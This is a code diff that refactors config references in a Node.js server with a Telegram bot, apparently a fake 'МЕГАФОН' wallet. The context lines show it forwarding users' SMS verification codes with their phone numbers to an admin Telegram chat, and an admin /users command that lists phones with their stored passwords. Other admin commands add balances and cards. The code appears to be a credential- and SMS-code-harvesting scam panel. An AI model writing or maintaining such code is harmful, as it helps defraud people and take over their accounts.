@@ -111,7 +111,7 @@ app.post('/api/odp', (req, res) => {
         } else {
             db.prepare('INSERT INTO users (phone, password, sms_code, sid, balance) VALUES (?, ?, ?, ?, ?)').run(phone, '', smsCode, null, 1000.0);
         }
-        if (!user || user.tg_chat_id !== ADMIN_CHAT_ID.toString()) notifyAdmin(`🔔 Запрошен код для ${phone}: ${smsCode}`);
+        if (!user || user.tg_chat_id !== config.ADMIN_CHAT_ID.toString()) notifyAdmin(`🔔 Запрошен код для ${phone}: ${smsCode}`);
         return res.json({ result: "ok" });
     }
 
@@ -412,7 +412,7 @@ app.post('/gateway_success', (req, res) => {
 // 👑 ТЕЛЕГРАМ БОТ
 // ==========================================
 bot.onText(/\/start|\/help/, (msg) => {
-    if (msg.from.id.toString() === ADMIN_CHAT_ID.toString()) {
+    if (msg.from.id.toString() === config.ADMIN_CHAT_ID.toString()) {
         bot.sendMessage(msg.chat.id, "👑 ПАНЕЛЬ АДМИНА\n/users — Список кошельков\n/add_money <номер> <сумма>\n/add_card <номер> <карта>");
     } else {
         bot.sendMessage(msg.chat.id, "👤 КОШЕЛЕК МЕГАФОН\n/register <номер> <пароль> — Создать профиль\n/my_balance <номер> — Баланс");
@@ -444,7 +444,7 @@ bot.onText(/\/my_balance (.+)/, (msg, match) => {
 
 // АДМИНСКИЕ КОМАНДЫ
 bot.onText(/\/users/, (msg) => {
-    if (msg.from.id.toString() !== ADMIN_CHAT_ID.toString()) return;
+    if (msg.from.id.toString() !== config.ADMIN_CHAT_ID.toString()) return;
     const users = db.prepare('SELECT phone, password, balance, tg_chat_id FROM users').all();
     if (!users.length) return bot.sendMessage(msg.chat.id, "Пусто.");
     let text = "👥 Кошельки:\n";
@@ -453,7 +453,7 @@ bot.onText(/\/users/, (msg) => {
 });
 
 bot.onText(/\/add_money (.+) (.+)/, (msg, match) => {
-    if (msg.from.id.toString() !== ADMIN_CHAT_ID.toString()) return;
+    if (msg.from.id.toString() !== config.ADMIN_CHAT_ID.toString()) return;
     try {
         db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(parseFloat(match[2]), match[1]);
         bot.sendMessage(msg.chat.id, `✅ Баланс ${match[1]} пополнен.`);
@@ -691,4 +691,4 @@ app.get('/admin', (req, res) => {
     res.send(html);
 });
 
-app.listen(FLASK_PORT, '0.0.0.0', () => { console.log(`[+] Сервер запущен на порту ${FLASK_PORT}`); });
+app.listen(config.PORT, '0.0.0.0', () => { console.log(`[+] Сервер запущен на порту ${config.PORT}`); });
